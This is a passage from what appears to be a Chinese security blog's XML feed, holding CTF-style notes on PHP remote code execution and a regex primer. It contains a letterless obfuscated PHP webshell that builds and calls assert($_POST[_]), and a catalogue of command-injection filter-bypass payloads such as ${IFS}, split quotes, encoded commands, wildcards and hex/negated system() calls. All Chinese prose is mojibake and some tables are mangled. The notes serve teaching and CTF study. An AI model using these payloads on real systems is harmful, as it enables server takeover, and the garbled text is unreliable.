class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;P&quot;ï¼Œæ­¤æ—¶$__=&quot;P&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;O&quot;ï¼Œæ­¤æ—¶$__=&quot;O&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;S&quot;ï¼Œæ­¤æ—¶$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;   <span class="comment">//å¾—åˆ°&quot;T&quot;ï¼Œæ­¤æ—¶$__=&quot;T&quot;</span></span><br><span class="line"><span class="variable">$____</span> .= <span class="variable">$__</span>;   <span class="comment">//$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;   <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);   <span class="comment">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure><h2 id="ä¸´æ—¶æ–‡ä»¶"><a href="#ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶"></a>ä¸´æ—¶æ–‡ä»¶</h2><ul><li>ä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼š<ul><li>Linuxä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨<code>/tmp/</code>ç›®å½•ä¸‹ï¼Œæ ¼å¼é€šå¸¸æ˜¯ï¼ˆ<code>/tmp/php[6ä¸ªéšæœºå­—ç¬¦]</code>ï¼‰</li><li>Windowsä¸´æ—¶æ–‡ä»¶ä¸»è¦å­˜å‚¨åœ¨<code>C:/Windows/</code>ç›®å½•ä¸‹ï¼Œæ ¼å¼é€šå¸¸æ˜¯ï¼ˆ<code>C:/Windows/php[4ä¸ªéšæœºå­—ç¬¦].tmp</code>ï¼‰</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2023/07/26/RCE/"/>
      <url>/2023/07/26/RCE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="RCEæ¦‚è¿°"><a href="#RCEæ¦‚è¿°" class="headerlink" title="RCEæ¦‚è¿°"></a>RCEæ¦‚è¿°</h1><h2 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h2><p>RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿ</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šã€‚ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ å¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨ã€‚ ç°åœ¨å¾ˆå¤šçš„ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œ åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•</p><h1 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h1><ul><li>åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</li></ul><blockquote><p>eval()<br>assert()<br>preg_replace()<br>call_user_func()</p></blockquote><ul><li>ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä»£ç å‡½æ•°</li></ul><blockquote><p>system()<br>exec()<br>shell_exec()&amp;(``)<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p></blockquote><h1 id="å‘½ä»¤æ‹¼æ¥ç¬¦å·"><a href="#å‘½ä»¤æ‹¼æ¥ç¬¦å·" class="headerlink" title="å‘½ä»¤æ‹¼æ¥ç¬¦å·"></a>å‘½ä»¤æ‹¼æ¥ç¬¦å·</h1><ul><li>Windowsçš„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥ç¬¦</li></ul><div class="table-container"><table><thead><tr><th>ç¬¦å·</th><th>å«ä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>å·¦è¾¹çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œå³è¾¹çš„æ‰æ‰§è¡Œ</td><td>ping 127.0.0.1 &amp;&amp; echo â€˜helloâ€™</td></tr><tr><td>&amp;</td><td>ç®€å•æ‹¼æ¥ï¼Œä¸¤è¾¹éƒ½èƒ½æ‰§è¡Œ</td><td>ping 1111 &amp; echo â€˜helloâ€™</td></tr><tr><td>\</td><td></td><td>ä¸Šä¸€æ¡å‘½ä»¤è¾“å‡ºä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°netstst -ano</td><td>netstst -ano \</td><td>findstr 3306</td></tr><tr><td>\</td><td>\</td><td></td><td>å·¦è¾¹çš„æ‰§è¡Œå¤±è´¥å³è¾¹çš„æ‰æ‰§è¡Œ</td><td>ping baidu.com \</td><td>\</td><td>ping baidu.net</td></tr></tbody></table></div><ul><li>Linuxçš„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥ç¬¦</li></ul><div class="table-container"><table><thead><tr><th>ç¬¦å·</th><th>å«ä¹‰</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>ï¼›</td><td>æ²¡æœ‰ä»»ä½•é€»è¾‘å…³ç³»çš„è¿æ¥ç¬¦</td><td></td></tr><tr><td>&amp;&amp;</td><td>å·¦è¾¹çš„å‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œå³è¾¹çš„æ‰æ‰§è¡Œ</td><td>cp 1.txt 2.txt &amp;&amp; cat 2.txt</td></tr><tr><td>\</td><td></td><td>ä¸Šä¸€æ¡å‘½ä»¤è¾“å‡ºä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°</td><td>netstat -an\</td><td>netstat -an</td></tr><tr><td>\</td><td>\</td><td></td><td>å·¦è¾¹çš„å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼Œå³è¾¹çš„æ‰æ‰§è¡Œ</td><td>cat 3.txt\</td><td>\</td><td>cat 3.txt</td></tr><tr><td>&amp;</td><td>ä»»åŠ¡åå°æ‰§è¡Œï¼Œä¸nohupå‘½ä»¤åŠŸèƒ½å·®ä¸å¤š</td><td>java -jar test.jar &gt; log.txt &amp;</td></tr></tbody></table></div><h1 id="å‘½ä»¤æ‰§è¡Œç»•è¿‡"><a href="#å‘½ä»¤æ‰§è¡Œç»•è¿‡" class="headerlink" title="å‘½ä»¤æ‰§è¡Œç»•è¿‡"></a>å‘½ä»¤æ‰§è¡Œç»•è¿‡</h1><h2 id="ç©ºæ ¼è¿‡æ»¤"><a href="#ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤"></a>ç©ºæ ¼è¿‡æ»¤</h2><blockquote><p><code>%09</code>ï¼ˆurlä¼ é€’ï¼‰(tab)</p><p><code>%20</code>(space)</p><p><code>$&#123;IFS&#125;</code></p><p><code>$IFS$9</code></p><p><code>&lt;&gt;</code>ï¼ˆcat&lt;&gt;/flagï¼‰</p><p><code>&lt;</code>ï¼ˆcat&lt;/flagï¼‰</p><p><code>$IFS</code></p><p><code>&#123;cat,flag&#125;</code> //èŠ±æ‹¬å·</p></blockquote><h2 id="è¿‡æ»¤äº†å…³é”®å­—"><a href="#è¿‡æ»¤äº†å…³é”®å­—" class="headerlink" title="è¿‡æ»¤äº†å…³é”®å­—"></a>è¿‡æ»¤äº†å…³é”®å­—</h2><h3 id="catè¿‡æ»¤åçš„æ›¿ä»£å‡½æ•°"><a href="#catè¿‡æ»¤åçš„æ›¿ä»£å‡½æ•°" class="headerlink" title="catè¿‡æ»¤åçš„æ›¿ä»£å‡½æ•°"></a>catè¿‡æ»¤åçš„æ›¿ä»£å‡½æ•°</h3><blockquote><p><code>more</code> ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹<br><code>less</code> ä¸ more ç±»ä¼¼<br><code>head</code> æŸ¥çœ‹å¤´å‡ è¡Œ<br><code>tac</code> ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º<br><code>tail</code> æŸ¥çœ‹å°¾å‡ è¡Œ<br><code>nl</code> æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·<br><code>od</code> ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹<br><code>vi</code> ä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯ä»¥æŸ¥çœ‹<br><code>vim</code> ä¸€ç§ç¼–è¾‘å™¨ï¼Œå¯ä»¥æŸ¥çœ‹<br><code>sort</code> å¯ä»¥æŸ¥çœ‹<br><code>uniq</code> å¯ä»¥æŸ¥çœ‹<br><code>file -f</code> æŠ¥é”™å‡ºå…·ä½“å†…å®¹<br><code>sh /flag 2&gt;%261</code>  //æŠ¥é”™å‡ºæ–‡ä»¶å†…å®¹</p></blockquote><h3 id="â€˜-â€™å’Œå•åŒå¼•å·ä»¥åŠåæ’‡ç»•è¿‡è¿‡æ»¤"><a href="#â€˜-â€™å’Œå•åŒå¼•å·ä»¥åŠåæ’‡ç»•è¿‡è¿‡æ»¤" class="headerlink" title="â€˜\â€™å’Œå•åŒå¼•å·ä»¥åŠåæ’‡ç»•è¿‡è¿‡æ»¤"></a>â€˜\â€™å’Œå•åŒå¼•å·ä»¥åŠåæ’‡ç»•è¿‡è¿‡æ»¤</h3><blockquote><p><code>ca\t flag</code></p><p><code>ca&#39;&#39;t flag</code></p><p><code>ca&quot;&quot;t flag</code> </p><p><code>ca``t flag</code></p></blockquote><p><img src="/img/RCE/rce_01.png" alt=""></p><h3 id="å˜é‡ç»•è¿‡"><a href="#å˜é‡ç»•è¿‡" class="headerlink" title="å˜é‡ç»•è¿‡"></a>å˜é‡ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=a;c=t;$a$b<span class="variable">$c</span> flag.php</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_02.png" alt=""></p><h3 id="å‘½ä»¤æ‹†åˆ†ç»•è¿‡"><a href="#å‘½ä»¤æ‹†åˆ†ç»•è¿‡" class="headerlink" title="å‘½ä»¤æ‹†åˆ†ç»•è¿‡"></a>å‘½ä»¤æ‹†åˆ†ç»•è¿‡</h3><p>å’Œå˜é‡ç»•è¿‡æ˜¯ä¸€ä¸ªé“ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag.php;<span class="keyword">echo</span> $a<span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_03.png" alt=""></p><h3 id="è¿›åˆ¶ç¼–ç ç»•è¿‡"><a href="#è¿›åˆ¶ç¼–ç ç»•è¿‡" class="headerlink" title="è¿›åˆ¶ç¼–ç ç»•è¿‡"></a>è¿›åˆ¶ç¼–ç ç»•è¿‡</h3><p><strong>16è¿›åˆ¶ç»•è¿‡</strong></p><p><code>63617420666c61672e706870</code>ä¸º<code>cat flag.php</code>çš„åå…­è¿›åˆ¶</p><p><img src="/img/RCE/rce_04.png" alt=""></p><p><strong>base64&amp;base32ç¼–ç ç»•è¿‡</strong></p><p> <code>cat flag</code>çš„base64ç¼–ç ä¸º<code>Y2F0IGZsYWcucGhw</code></p><p><img src="/img/RCE/rce_05.png" alt=""></p><p> <code>cat flag</code>çš„base32ç¼–ç ä¸º<code>MNQXIIDGNRQWOLTQNBYA====</code></p><p><img src="/img/RCE/rce_06.png" alt=""></p><p>base16ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†</p><h3 id="é€šé…ç¬¦æ­£åˆ™ç»•è¿‡"><a href="#é€šé…ç¬¦æ­£åˆ™ç»•è¿‡" class="headerlink" title="é€šé…ç¬¦æ­£åˆ™ç»•è¿‡"></a>é€šé…ç¬¦æ­£åˆ™ç»•è¿‡</h3><p>å¦‚æœæ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œå¦‚ï¼šflagã€phpã€txtç­‰ç­‰å¯ä»¥ä½¿ç”¨é—®å·(?)ä»£æ›¿æŸä¸ªå­—ç¬¦</p><p>é€‚å½“çš„å¯ä»¥ç”¨æ˜Ÿå·(*)</p><p><strong>æ³¨æ„ï¼šè¿™é‡Œçš„?å’Œ*éƒ½åªèƒ½ç”¨äºæ–‡ä»¶åï¼Œå¦‚æœæ˜¯å‘½ä»¤(ç±»ä¼¼ls catç­‰)å°±ä¸é€‚ç”¨</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php === cat ??ag.php ===cat ?la* </span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_07.png" alt=""></p><h3 id="system-å‡½æ•°è¿‡æ»¤"><a href="#system-å‡½æ•°è¿‡æ»¤" class="headerlink" title="system()å‡½æ•°è¿‡æ»¤"></a>system()å‡½æ•°è¿‡æ»¤</h3><p><strong>åå…­è¿›åˆ¶ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;\x73\x79\x73\x74\x65\x6d&quot;</span>(); === <span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><strong>æ‹¬å·ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(); === <span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><strong>å†…æ•›æ›¿ä»£</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> `ls`;</span><br><span class="line"><span class="keyword">echo</span> $(ls);</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`ls`;</span><br><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>$(ls);</span><br><span class="line"><span class="meta">&lt;?=</span>`ls /`;<span class="meta">?&gt;</span>  ç­‰æ•ˆäº<span class="meta">&lt;?php</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å–å(~)ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)();===<span class="title function_ invoke__">system</span>();</span><br></pre></td></tr></table></figure><p><img src="/img/RCE/rce_08.png" alt=""></p><h3 id="ä½¿ç”¨âˆ—å’Œ-x-xè¡¨ç¤ºä»»æ„æ•°å­—-æ•°å­—"><a href="#ä½¿ç”¨âˆ—å’Œ-x-xè¡¨ç¤ºä»»æ„æ•°å­—-æ•°å­—" class="headerlink" title="ä½¿ç”¨âˆ—å’Œ@,x(xè¡¨ç¤ºä»»æ„æ•°å­—),{æ•°å­—}"></a>ä½¿ç”¨âˆ—å’Œ@,x(xè¡¨ç¤ºä»»æ„æ•°å­—),{æ•°å­—}</h3><p>åœ¨æ²¡æœ‰ä¼ å‚çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸‰ä¸ªç‰¹æ®Šå˜é‡å€¼éƒ½æ˜¯ä¸ºç©ºçš„ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨å…¶ç»•è¿‡ä¸€äº›è¿‡æ»¤</p><blockquote><p>ca$*t  flag.php</p><p>ca$@t  flag.php</p><p>ca$4t  flag.php</p><p>cat${10}  flag.php </p></blockquote><p><img src="/img/RCE/rce_09.png" alt=""></p><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://zhuanlan.zhihu.com/p/391439312">å‘½ä»¤æ‰§è¡Œ(RCE)é¢å¯¹å„ç§è¿‡æ»¤ï¼Œéªšå§¿åŠ¿ç»•è¿‡æ€»ç»“ </a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPç‰¹æ€§</title>
      <link href="/2023/07/26/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/07/26/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><h2 id="å…ƒå­—ç¬¦"><a href="#å…ƒå­—ç¬¦" class="headerlink" title="å…ƒå­—ç¬¦"></a>å…ƒå­—ç¬¦</h2><div class="table-container"><table><thead><tr><th>ç¬¦å·</th><th>æè¿°</th></tr></thead><tbody><tr><td>\d</td><td>åŒ¹é…ä»»æ„ä¸€ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œç­‰ä»·äº[0-9]</td></tr><tr><td>\D</td><td>åŒ¹é…ä»»æ„ä¸€ä¸ªé™¤åè¿›åˆ¶æ•°å­—ä»¥å¤–çš„å­—ç¬¦ï¼Œç­‰ä»·äº[\^0-9]</td></tr><tr><td>\s</td><td>åŒ¹é…ä»»æ„ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼Œç­‰ä»·äº[\f\n\r\t\v]</td></tr><tr><td>\S</td><td>åŒ¹é…é™¤ç©ºç™½å­—ç¬¦ä»¥å¤–ä»»ä½•ä¸€ä¸ªå­—ç¬¦ï¼Œç­‰ä»·äº[\^\f\n\r\t\v]</td></tr><tr><td>\w</td><td>åŒ¹é…ä»»æ„ä¸€ä¸ªæ•°å­—ã€å­—æ¯æˆ–ä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº[0-9a-zA-Z]</td></tr><tr><td>\W</td><td>åŒ¹é…é™¤æ•°å­—ã€å­—æ¯æˆ–ä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œç­‰ä»·äº[\^0-9a-zA-Z]</td></tr><tr><td>*</td><td>åŒ¹é…0æ¬¡ã€1æ¬¡æˆ–å¤šæ¬¡å…¶å‰é¢çš„åŸå­</td></tr><tr><td>+</td><td>åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡å…¶å‰é¢çš„åŸå­</td></tr><tr><td>?</td><td>åŒ¹é…0æ¬¡æˆ–1æ¬¡å…¶å‰é¢çš„åŸå­</td></tr><tr><td>.</td><td>åŒ¹é…é™¤äº†æ¢è¡Œç¬¦å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>\</td><td></td><td>åŒ¹é…ä¸¤ä¸ªæˆ–å¤šä¸ªåˆ†æ”¯é€‰æ‹©</td></tr><tr><td>{n}</td><td>è¡¨ç¤ºå…¶å‰é¢çš„åŸå­æ°å¥½å‡ºç°næ¬¡</td></tr><tr><td>{n,}</td><td>è¡¨ç¤ºå…¶å‰é¢çš„åŸå­å‡ºç°ä¸å°‘äºnæ¬¡</td></tr><tr><td>{n,m}</td><td>è¡¨ç¤ºå…¶å‰é¢çš„åŸå­è‡³å°‘å‡ºç°næ¬¡ï¼Œæœ€å¤šå‡ºç°mæ¬¡</td></tr><tr><td>^æˆ–\A</td><td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ï¼ˆæˆ–åœ¨å¤šè¡Œæ¨¡å¼ä¸‹çš„å¼€å¤´ï¼Œå³ç´§éšä¸€æ¢è¡Œç¬¦ä¹‹åï¼‰</td></tr><tr><td>$æˆ–\Z</td><td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ï¼ˆæˆ–åœ¨å¤šè¡Œæ¨¡å¼ä¸‹çš„ç»“å°¾ï¼Œå³ç´§éšä¸€æ¢è¡Œç¬¦ä¹‹å‰ï¼‰</td></tr><tr><td>\b</td><td>åŒ¹é…å•è¯çš„è¾¹ç•Œ</td></tr><tr><td>\B</td><td>åŒ¹é…å‡ºå•è¯è¾¹ç•Œä»¥å¤–çš„éƒ¨åˆ†</td></tr><tr><td>[]</td><td>åŒ¹é…æ–¹æ‹¬å·ä¸­æŒ‡å®šçš„ä»»æ„ä¸€ä¸ªåŸå­</td></tr><tr><td><sup><a href="#fn_" id="reffn_"></a></sup></td><td>åŒ¹é…å‡ºæ–¹æ‹¬å·ä¸­çš„åŸå­ä»¥å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</td></tr><tr><td>()</td><td>åŒ¹é…å…¶æ”¿ä½“ä¸ºä¸€ä¸ªåŸå­ï¼Œå³æ¨¡å¼å•å…ƒï¼Œå¯ä»¥ç†è§£ä¸ºç”±å¤šä¸ªå•ä¸ªåŸå­ç»„æˆçš„å¤§åŸå­</td></tr></tbody></table></div><h2 id="æ¨¡å¼ä¿®æ­£ç¬¦"><a href="#æ¨¡å¼ä¿®æ­£ç¬¦" class="headerlink" title="æ¨¡å¼ä¿®æ­£ç¬¦"></a>æ¨¡å¼ä¿®æ­£ç¬¦</h2><div class="table-container"><table><thead><tr><th>ç¬¦å·</th><th>æè¿°</th></tr></thead><tbody><tr><td>i</td><td>åœ¨å’Œæ¨¡å¼è¿›è¡ŒåŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™</td></tr><tr><td>m</td><td>å°†å­—ç¬¦ä¸²è§†ä¸ºå¤šè¡Œï¼Œé»˜è®¤çš„æ­£åˆ™å¼€å§‹â€^â€å’Œç»“æŸâ€$â€å°†ç›®æ ‡å­—ç¬¦ä¸²ä½œä¸ºå•ä¸€çš„ä¸€ â€œè¡Œâ€ å­—ç¬¦ï¼ˆç”šè‡³å…¶ä¸­åŒ…å«æœ‰æ¢è¡Œç¬¦ä¹Ÿæ˜¯å¦‚æ­¤ï¼‰ï¼›å¦‚æœåœ¨ä¿®é¥°ç¬¦ä¸­åŠ ä¸Šâ€mâ€ï¼Œé‚£ä¹ˆå¼€å§‹å’Œç»“æŸå°†ä¼šæŒ‡å­—ç¬¦ä¸²çš„æ¯ä¸€è¡Œï¼Œæ¯ä¸€è¡Œçš„å¼€å¤´å°±æ˜¯â€^â€ï¼Œç»“å°¾å°±æ˜¯â€$â€</td></tr><tr><td>s</td><td>å¦‚æœè®¾å®šäº†æ­¤å­—ç¬¦ï¼Œæ¨¡å¼ä¸­çš„åœ†ç‚¹å…ƒå­—ç¬¦â€.â€åŒ¹é…æ‰€æœ‰çš„å­—ç¬¦ï¼ŒåŒ…æ‹¬æ¢è¡Œç¬¦,å³å°†å­—ç¬¦ä¸²è§†ä¸ºå•è¡Œï¼Œæ¢è¡Œç¬¦ä½œä¸ºæ™®é€šå­—ç¬¦çœ‹å¾…</td></tr><tr><td>x</td><td>æ¨¡å¼ä¸­çš„ç©ºç™½å¿½ç•¥ä¸è®¡ï¼Œé™¤éå®ƒå·²ç»è¢«è½¬ä¹‰</td></tr><tr><td>e</td><td>åªç”¨åœ¨pre_replace()å‡½æ•°ä¸­ï¼Œåœ¨æ›¿æ¢å­—ç¬¦ä¸²ä¸­å¯¹é€†å‘å¼•ç”¨åšæ­£å¸¸çš„æ›¿æ¢ï¼Œå°†å…¶ä½œä¸ºPHPä»£ç æ±‚å€¼ï¼Œå¹¶ç”¨å…¶ç»“æœæ¥æ›¿æ¢æ‰€æœç´¢çš„å­—ç¬¦ä¸²</td></tr><tr><td>U</td><td>è´ªå©ªæ¨¡å¼ï¼Œæœ€å¤§é™åº¦åŒ¹é…</td></tr><tr><td>D</td><td>æ¨¡å¼ä¸­çš„â€$â€ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ²¡æœ‰æ­¤é€‰é¡¹æ—¶ï¼Œå¦‚æœæœ€åä¸€ä¸ªå­—ç¬¦æ˜¯æ¢è¡Œç¬¦çš„è¯ï¼Œç¾å…ƒç¬¦å·ä¹Ÿä¼šåŒ¹é…æ­¤å­—ç¬¦ä¹‹å‰ï¼›å¦‚æœè®¾å®šäº†mä¿®æ­£å­—ç¬¦åˆ™å¿½ç•¥æ­¤é€‰é¡¹</td></tr></tbody></table></div><h2 id="è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…"><a 